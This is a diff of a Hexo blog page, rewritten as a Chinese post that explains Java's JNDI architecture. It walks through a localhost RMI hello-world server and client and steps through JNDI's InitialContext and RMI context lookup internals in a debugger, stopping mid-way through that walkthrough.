@@ -1,1 +1,669 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" href="/favicon.ico"><script type="module" crossorigin src="/static/js/120aa8f8.js"></script><link rel="stylesheet" href="/static/css/a14e1a22.css"><!-- hexo injector head_end start --><script rel="prefetch" async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script rel="preload" src="https://unpkg.com/blueimp-md5@^2.19.0/js/md5.min.js"></script><script rel="preload" src="https://unpkg.com/lodash@^4.17.21/lodash.min.js"></script><link rel="stylesheet" href="https://fonts.loli.net/css?family=Rubik" /><script rel="preload" src="https://unpkg.com/gitalk@^1.8.0/dist/gitalk.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk@^1.8.0/dist/gitalk.css"/><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body id="body-container"><noscript><strong>We're sorry but this app doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><div id="app"></div></body></html>
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="stoocea" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  <meta name="description" content="time thicking away" />
+  
+  
+  
+  <title>
+    
+      JNDI重看 
+      
+      
+      |
+    
+     stoocea&#39;s blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="https://bu.dusays.com/2024/08/09/66b6003e9e298.png">
+    <link rel="icon" href="https://bu.dusays.com/2024/08/09/66b6003e9e298.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="https://bu.dusays.com/2024/08/09/66b609e582b55.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Stoocea</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">JNDI重看</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2024-08-09 18:24:16
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/JNDI/" title="JNDI">
+                    #JNDI
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="什么是-JNDI"><a href="#什么是-JNDI" class="headerlink" title="什么是 JNDI"></a>什么是 JNDI</h1><p>英文全写为：<code>Java Naming and Directory Interface</code>，翻译叫做 JAVA 命名和目录接口，是 sun 公司提供的一种标准的	java 命令系统接口，JNDI 提供统一的客户端 API,并由管理者将服务端映射为 JNDI 上的特定服务和对象，简单来说就是： <strong>JNDI，能够让用户通过统一的方式访问获取网络上的各种资源和服务  （键值对找东西）</strong><br>Naming 和 Directroy</p>
+<h2 id="0x01-Naming-命名服务"><a href="#0x01-Naming-命名服务" class="headerlink" title="0x01 Naming 命名服务"></a>0x01 Naming 命名服务</h2><p>提供一种由键值对构成的通过名称来查找实际对象的服务，比如 RMI 协议，就是客户端通过注册中心上的对象名称得到远程对象的引用，有几个名词需要解释一下</p>
+<ul>
+<li>Bindings：表示<strong>一个</strong>名称和对应对象的绑定关系，也就是 DNS 域名绑定到对应 IP 上，RMI 中一个远程对象去绑定一个名称</li>
+<li>Context: 表示一组名称和对应对象的绑定，比如 spring 中的 IOC 容器，里面就存在 id 和各种 javabean 的对应关系，javaweb 中的 standardContext 等</li>
+<li>References：在一个实际的对象存储键值对中，有些对象他并不能直接存储在系统中，这个时候就需要<code>References</code>（引用）来代表这个对象，而一个引用中必须要包含该实际对象的信息，运作状态等等。最形象的是 linux 文件系统中的 fd（ file descriptor ），我们实际对文件的操作是内容通过这个 fd 找到磁盘中对应位置和读写偏移的。</li>
+</ul>
+<h2 id="0x02-Directory-目录服务"><a href="#0x02-Directory-目录服务" class="headerlink" title="0x02 Directory 目录服务"></a>0x02 Directory 目录服务</h2><p>目录服务相当于命名服务的一个扩展，一个键值对的信息服务中，实际对象还能够拥有对应的属性（attributes）信息，那我们进行 lookup 查找操作的时候，就不止通过名称去查找，还可以通过属性值去查找</p>
+<h2 id="0x03-JNDI-SPI"><a href="#0x03-JNDI-SPI" class="headerlink" title="0x03 JNDI SPI"></a>0x03 JNDI SPI</h2><p>JNDI 架构如下：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709878054437-6a112ecc-4601-4fa1-bb9f-c4252c6c5366.png#averageHue=%23be9b34&clientId=uc227c08e-913c-4&from=paste&height=386&id=u3507a37d&originHeight=579&originWidth=850&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=85892&status=done&style=none&taskId=u0885bb26-e3f5-4556-bfa0-2678f5f6d1c&title=&width=566.6666666666666" referrerpolicy="no-referrer" alt="l5qgw3jccj.png"><br>层次由上往下，我们最终接触到的 JDNI 部分是 SPI，SPI 主要是为底层的具体目录服务提供统一的接口，从而实现目录服务的可插拔式的安装<br>从这种图就能看出，JDK 原生的 JNDI 有如下服务：</p>
+<ul>
+<li>RMI: Java Remote Method Invocation，Java 远程方法调用</li>
+<li>LDAP: 轻量级目录访问协议</li>
+<li>CORBA: Common Object Request Broker Architecture，通用对象请求代理架构，用于 COS 名称服务(Common Object Services)</li>
+<li>DNS（域名转换协议）</li>
+</ul>
+<h1 id="JNDI-代码实现"><a href="#JNDI-代码实现" class="headerlink" title="JNDI 代码实现"></a>JNDI 代码实现</h1><p>JNDI 主要分为如下几个包：</p>
+<ul>
+<li>javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类</li>
+<li>javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir-Context类</li>
+<li>javax.naming.event：在命名目录服务器中请求事件通知</li>
+<li>javax.naming.ldap：提供LDAP服务支持</li>
+<li>javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务</li>
+</ul>
+<p>开始代码的具体实现 </p>
+<h3 id="0x01-JNDI-RMI-实现"><a href="#0x01-JNDI-RMI-实现" class="headerlink" title="0x01 JNDI_RMI 实现"></a>0x01 JNDI_RMI 实现</h3><p>先写 RMI 的服务端<br>远程对象接口：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.stoocea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Object name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>远程对象：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.stoocea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObject</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteInterface</span>  &#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="title function_">RemoteObject</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Object name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>服务端逻辑：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMI_Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        RemoteObject remoteObject=<span class="keyword">new</span> <span class="title class_">RemoteObject</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://localhost:1099/Hello&quot;</span>,remoteObject);</span><br><span class="line">        System.out.println(<span class="string">&quot;server端正在运行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p> 启动 RMI 服务，然后我们用 JNDI 的接口去调远程对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.stoocea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Hashtable&lt;String,String&gt; env=<span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String,String&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Context</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">        RemoteInterface remoteObject=(RemoteInterface) initialContext.lookup(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">        System.out.println(remoteObject.sayHello(<span class="string">&quot;stoocea&quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>调用结果如下<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709881726884-296c72f9-c169-4fb6-9bf7-9f1305ae0647.png#averageHue=%233f434c&clientId=u3dcabff8-befb-4&from=paste&height=86&id=ue3bc9478&originHeight=129&originWidth=772&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=34813&status=done&style=none&taskId=u4d1b64e6-9f5f-432b-bd42-4905f157296&title=&width=514.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>稍微分析一下 JNDI 实现端的逻辑：<br>我们通过 设置环境变量，指定了要从哪获取对象，也就是 1099 端口上的 registry 注册中心，然后就调用创建出来的 Context 的 lookup 即可<br>那么 JNDI 是如何识别我们指定的服务，以及如何定位到服务中心的？</p>
+<h1 id="JNDI-工作流程"><a href="#JNDI-工作流程" class="headerlink" title="JNDI 工作流程"></a>JNDI 工作流程</h1><h2 id="0x01-context-初始化和对应属性设置"><a href="#0x01-context-初始化和对应属性设置" class="headerlink" title="0x01 context 初始化和对应属性设置"></a>0x01 context 初始化和对应属性设置</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709958482095-1b3cbfad-8fb1-40b5-8cf2-25565f77066f.png#averageHue=%233c414a&clientId=u1db2a60e-ea5c-4&from=paste&height=285&id=S1R4D&originHeight=428&originWidth=1040&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=217100&status=done&style=none&taskId=ue0a53bb7-7ab3-4ab9-ac34-a8845a585d4&title=&width=693.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>我们之前提到过 JNDI 的整体架构，最近的一层是 JNDI 的 spi 层，他是我们能够接触到的 JNDI 最直接的，然后我们看 InitalContext 的导包结构，他导入了 naming 下的 spi 服务，而 SPI 本身的作用主要是为底层的具体目录服务提供统一的接口，从而能够使得目录服务的可插拔安装，这正好对应 InitialContext 为什么要获取 <code>INITIAL_CONTEXT_FACTORY</code>与<code>PROVIDER_URL</code>，正是为了满足这一条件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hashtable&lt;String,String&gt; env=<span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String,String&gt;();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">env.put(Context.PROVIDER_URL, <span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Context</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>INITIAL_CONTEXT_FACTORY</code>能够让 initalContext 能够正常获取到我们想要指定的服务名称</li>
+<li><code>PROVIDER_URL</code>能够让初始化出来的 context 定位到服务位置</li>
+</ul>
+<p>这其实跟之前 RMI 获取到服务中心的流程很像，而 RMI 其实是隶属于 JNDI 的，所以操作步骤也是差不多的<br>除了这么一个通过 hashtable 传值初始化 initcontext 的方法，还有其他两种方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709960790782-f8b6eb11-8aa4-408e-a245-4840911c3e82.png#averageHue=%233b3f48&clientId=u1db2a60e-ea5c-4&from=paste&height=103&id=ufb536bf0&originHeight=155&originWidth=553&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=42849&status=done&style=none&taskId=uc319a1a8-3960-4412-bdd7-fa82213109c&title=&width=368.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>第一个是选择不初始化 initcontext<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709960852314-59e9baee-1377-43e7-9681-cdd8bcd16140.png#averageHue=%233e444f&clientId=u1db2a60e-ea5c-4&from=paste&height=91&id=u35582505&originHeight=136&originWidth=892&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=54271&status=done&style=none&taskId=u9a80c55f-c893-45ee-82ee-0699050856f&title=&width=594.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>直接调用 init 方法，从环境变量中获取属性值<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709960874141-34d29a29-30f7-4f78-8b81-2a28da85d7c0.png#averageHue=%233d434d&clientId=u1db2a60e-ea5c-4&from=paste&height=327&id=uc6d20593&originHeight=490&originWidth=1171&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=254651&status=done&style=none&taskId=u5ef480c5-b930-4954-9fb0-b9c6d036209&title=&width=780.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>实现如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置JNDI环境变量</span></span><br><span class="line"></span><br><span class="line">System.setProperty(Context.INITIAL_CONTEXT_FACTORY,<span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.setProperty(Context.PROVIDER_URL,<span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化上下文</span></span><br><span class="line"></span><br><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br></pre></td></tr></table></figure>
+
+<p>JNDI 的功能点其实和 RMI 差不多</p>
+<h2 id="0x02-JNDI-底层实现"><a href="#0x02-JNDI-底层实现" class="headerlink" title="0x02 JNDI 底层实现"></a>0x02 JNDI 底层实现</h2><h3 id="1x01-获取-contect-的-factor-构造类"><a href="#1x01-获取-contect-的-factor-构造类" class="headerlink" title="1x01 获取 contect 的 factor 构造类"></a>1x01 获取 contect 的 factor 构造类</h3><p>我们把断点打在<code>initcontext</code>初始化的地方<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709962859359-b3d0792c-80f0-4824-9db3-b9e0b03e5c7b.png#averageHue=%233e444d&clientId=u1db2a60e-ea5c-4&from=paste&height=231&id=uef32c070&originHeight=346&originWidth=1809&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=297125&status=done&style=none&taskId=u9bf5dbad-2637-4d31-b152-67864075202&title=&width=1206" referrerpolicy="no-referrer" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709963021470-6782f214-c516-4622-8ad3-9bf522701e79.png#averageHue=%233d434c&clientId=u1db2a60e-ea5c-4&from=paste&height=231&id=ue19f3aab&originHeight=347&originWidth=1019&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=143299&status=done&style=none&taskId=ub9161b29-c6f2-4f52-b54d-2ce178cfa96&title=&width=679.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>然后继续跟进<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709963003765-9e30d29f-a28a-4606-8ac2-ce98fcf24024.png#averageHue=%233d434d&clientId=u1db2a60e-ea5c-4&from=paste&height=332&id=ue092f1e6&originHeight=498&originWidth=1222&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=248715&status=done&style=none&taskId=u4af5563d-1678-4d70-9683-b1cf812908f&title=&width=814.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>在 init 方法中，首先是获取环境变量，也就是当前系统，以及我们刚才设置的 hashtable 的环境变量<br>然后跟进 getDefaultInitCtx()方法，最终跟进到 NamingManager 的 <code>getInitialContext</code>方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709963127706-537baf2b-d819-48da-aa30-d8a36b6953ce.png#averageHue=%23444a55&clientId=u1db2a60e-ea5c-4&from=paste&height=457&id=u2e44740f&originHeight=685&originWidth=1381&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=417841&status=done&style=none&taskId=u8dd2c531-0c7e-4bf0-89d0-938e9ac8dfe&title=&width=920.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>首先<code>getInitialContextFactoryBuilder();</code>获取到 Context 的工厂 builder 类，如果 builder 为空，就直接获取<code>INITIAL_CONTEXT_FACTORY</code>属性，作为我们的 Context 工厂 builer 类，那这里就是我们刚才通过 hashtable 设置的<code>com.sun.jndi.rmi.registry.RegistryContextFactory</code>了<br>然后继续往下<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709963494884-d01fe898-5e1c-4007-8e17-bde81fbd4441.png#averageHue=%23434a55&clientId=u1db2a60e-ea5c-4&from=paste&height=405&id=ufe9049a4&originHeight=608&originWidth=1214&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=289622&status=done&style=none&taskId=uf82fb388-9213-4632-898b-b9e91d29b9d&title=&width=809.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>通过 loadClass 动态加载工厂类，最后调用 RegistryContextFactory的getInitialContext方法<br>整理一下调用类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">InitialContext#init()</span><br><span class="line">    getDefaultInitCtx();</span><br><span class="line">        NamingManager.getInitialContext()</span><br><span class="line">                    VersionHelper.loadClass(className).newInstance();(这个helper是NamingManager中的一个属性值，专门用来动态实例化类)</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709964014420-cec5e139-283d-4569-bee8-4a21b2d0ad57.png#averageHue=%23555555&clientId=u1db2a60e-ea5c-4&from=paste&height=84&id=u638989ea&originHeight=126&originWidth=880&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=11083&status=done&style=none&taskId=udbf996e7-ca81-4a20-aeeb-ac3c7589894&title=&width=586.6666666666666" referrerpolicy="no-referrer" alt="未命名文件.png"><br>事后继续翻阅流程的时候也在最终返回的 getInitialContext 方法中，发现实现了这个方法的类就那么几个，也就是 JNDI 服务种类的那些<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709964466086-fd5af5f0-8471-46fd-9776-f040c843ef97.png#averageHue=%2352666c&clientId=u1db2a60e-ea5c-4&from=paste&height=166&id=u9b392616&originHeight=249&originWidth=1188&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=111952&status=done&style=none&taskId=u1de5d9fc-fa3e-4bb0-b3d5-986892b57be&title=&width=792" referrerpolicy="no-referrer" alt="image.png"></p>
+<h3 id="1x02-获取-context-内容"><a href="#1x02-获取-context-内容" class="headerlink" title="1x02 获取 context 内容"></a>1x02 获取 context 内容</h3><p>继续跟进 factrory 的 getInitialContext 的方法，这里的 var1 就是我们自己传的那个 hashtable 变量<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709964200592-4b3056d9-bc20-4bf0-b930-c285b2fc05f2.png#averageHue=%23424853&clientId=u1db2a60e-ea5c-4&from=paste&height=527&id=u1a05f4b6&originHeight=790&originWidth=1857&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=580106&status=done&style=none&taskId=u5c8f57e5-5f21-40e6-b89f-70989394da1&title=&width=1238" referrerpolicy="no-referrer" alt="image.png"><br>var1 作为 getInitCtxURL 的参数值跟进<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709964335769-5e04ef94-399e-46d2-a419-efbe64d375a5.png#averageHue=%23424853&clientId=u1db2a60e-ea5c-4&from=paste&height=540&id=ufe00a006&originHeight=810&originWidth=1423&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=497125&status=done&style=none&taskId=u329bdd2f-599f-41df-a4f8-bd932409f37&title=&width=948.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>分析逻辑，这里是类 RegistryContextFactory，所以如果 var2 为空，他默认是返回 rmi 协议头，但是没有 URL 解析，这里我们 var2 肯定不为空，所以就直接返回 var2<br>继续跟进外层的 URLToContext<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709971563591-feaf0944-60e8-4b94-8b67-01e162d64b92.png#averageHue=%234b505e&clientId=u1db2a60e-ea5c-4&from=paste&height=257&id=u56a07f33&originHeight=385&originWidth=1755&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=287991&status=done&style=none&taskId=u7784f39e-fca1-4a88-b48c-b86566f7706&title=&width=1170" referrerpolicy="no-referrer" alt="image.png"><br>开始调用 rmiURLContextFactory 的 getObjectInstance 方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709971859094-5dab14d4-30b5-4b60-9369-29b28a16cea5.png#averageHue=%23474e59&clientId=u1db2a60e-ea5c-4&from=paste&height=298&id=udede1636&originHeight=447&originWidth=1963&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=354789&status=done&style=none&taskId=u83023e36-779e-4b75-b843-d0216c92ad8&title=&width=1308.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>这里会判断我们的 RMIURL 是否为空之后，跟进 <code>getUsingURL</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709973476747-caa5cb1f-6cd1-42bb-ac1b-86c0c34b0749.png#averageHue=%233d444e&clientId=u1db2a60e-ea5c-4&from=paste&height=264&id=u259c4202&originHeight=396&originWidth=1634&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=252501&status=done&style=none&taskId=u6c71e4e0-2e2a-4159-b77e-aac4aa678c7&title=&width=1089.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>很奇怪，这里会直接调用 rmiURLContext 的 lookup 方法，但是此时 RMI 等相关配置还未装配，继续跟进看看逻辑<br>由于 rmiURLContext 本身是不带 lookup 方法，所以直接到父类<code>GenericURLContext</code>的 lookup 方法<br><img 